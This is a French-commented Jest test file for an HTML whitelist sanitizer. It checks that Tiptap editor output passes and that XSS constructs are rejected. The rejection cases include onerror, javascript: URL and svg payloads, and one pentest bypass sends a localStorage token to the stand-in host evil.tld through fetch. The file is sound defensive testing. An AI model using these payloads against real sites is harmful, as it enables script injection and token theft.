import { analyzeHtml, isSafeHtml } from './safe-html';

/**
 * Correctif H-D — le HTML riche (actualités, descriptions de projet) est rendu
 * tel quel côté public. Ces tests figent les deux exigences du contrôle :
 * 1. la sortie légitime de l'éditeur Tiptap passe (pas de régression rédaction) ;
 * 2. toute construction exécutable est refusée — y compris les contournements
 *    qui traversaient le sanitizer du front (remontée d'enfants après
 *    déballage d'une balise inconnue).
 */
describe('analyzeHtml — liste blanche du HTML riche (H-D)', () => {
  describe('accepte la sortie légitime de Tiptap', () => {
    const cas: [string, string][] = [
      ['paragraphe et gras', '<p>Bonjour <strong>monde</strong></p>'],
      ['titres et listes', '<h2>Titre</h2><ul><li>un</li><li>deux</li></ul>'],
      ['liste ordonnée avec start', '<ol start="3"><li>trois</li></ol>'],
      ['séparateur horizontal', '<p>a</p><hr><p>b</p>'],
      ['citation et barré', '<blockquote><p><s>ancien</s></p></blockquote>'],
      [
        'bloc de code avec classe',
        '<pre><code class="language-js">const a = 1 &lt; 2;</code></pre>',
      ],
      [
        'lien Tiptap complet',
        '<p><a class="text-[#3590eb] underline" rel="noopener noreferrer" target="_blank" href="https://beown.fr/projets">notre projet</a></p>',
      ],
      [
        'image Cloudinary',
        '<img class="rounded-lg max-w-full" src="https://res.cloudinary.com/beown/image/upload/v1/news/a.png" alt="Chantier">',
      ],
      ['lien relatif absolu', '<a href="/projets/42">voir</a>'],
      ['lien relatif sans schéma', '<img src="photos/chantier.png" alt="">'],
      ['ancre', '<a href="#section">aller</a>'],
      ['mailto', '<a href="mailto:contact@beown.fr">écrire</a>'],
      ['texte contenant un chevron', '<p>5 < 10 et 3 > 2</p>'],
      ['chaîne vide', ''],
      ['texte brut', 'Une actualité sans balise.'],
    ];

    it.each(cas)('%s', (_label, html) => {
      expect(analyzeHtml(html)).toEqual({ ok: true });
    });
  });

  describe('refuse toute construction exécutable', () => {
    const cas: [string, string][] = [
      ['script', '<script>alert(1)</script>'],
      ['gestionnaire onerror', '<img src="x" onerror="alert(1)">'],
      ['onerror sans guillemets', '<img src=x onerror=alert(1)>'],
      ['onerror séparé par un slash', '<img/onerror=alert(1) src=x>'],
      ['onerror séparé par une tabulation', '<img\tonerror="alert(1)" src="x">'],
      ['onload sur balise autorisée', '<div onload="alert(1)">x</div>'],
      ['attribut style', '<p style="background:url(javascript:alert(1))">x</p>'],
      ['iframe', '<iframe src="https://evil.tld"></iframe>'],
      ['balise inconnue', '<xyz>texte</xyz>'],
      ['form', '<form action="https://evil.tld"><input></form>'],
      ['svg', '<svg onload="alert(1)"></svg>'],
      ['commentaire HTML', '<!-- <img src=x onerror=alert(1)> -->'],
      ['href javascript', '<a href="javascript:alert(1)">clic</a>'],
      ['href javascript encodé', '<a href="&#106;avascript:alert(1)">clic</a>'],
      ['href javascript avec tabulation', '<a href="java\tscript:alert(1)">clic</a>'],
      ['src data:text/html', '<img src="data:text/html;base64,PHNjcmlwdD4=">'],
      ['valeur non terminée', '<a href="https://beown.fr>clic</a>'],
      ['balise non terminée', '<p class="x"'],
      ['balise fermante malformée', '</ p>'],
    ];

    it.each(cas)('refuse : %s', (_label, html) => {
      const verdict = analyzeHtml(html);
      expect(verdict.ok).toBe(false);
      expect(verdict.reason).toBeTruthy();
    });
  });

  describe('les contournements du sanitizer front sont refusés à la source', () => {
    // Charges utiles dont l'exécution a été constatée en navigateur pendant le
    // pentest : une balise non autorisée était déballée et ses enfants
    // remontés sans être ré-inspectés.
    const cas: [string, string][] = [
      ['remontée via <form>', '<form><img src=x onerror="fetch(`//evil.tld?c=`+localStorage.token)"></form>'],
      ['remontée via balise inconnue', '<xyz><img src=x onerror="alert(1)"></xyz>'],
      ['remontée d’un href javascript', '<form><a href="javascript:alert(1)">clic</a></form>'],
    ];

    it.each(cas)('%s', (_label, html) => {
      expect(isSafeHtml(html)).toBe(false);
    });
  });

  it('refuse un caractère NUL (tronque l’analyse de certains parseurs)', () => {
    expect(isSafeHtml(`<p>a${String.fromCharCode(0)}</p>`)).toBe(false);
  });

  it('nomme le motif du refus pour que l’auteur puisse corriger', () => {
    expect(analyzeHtml('<script>x</script>').reason).toContain('script');
    expect(analyzeHtml('<img alt="a" onerror=y>').reason).toContain('onerror');
    expect(analyzeHtml('<a href="javascript:x">l</a>').reason).toContain('URL');
  });
});
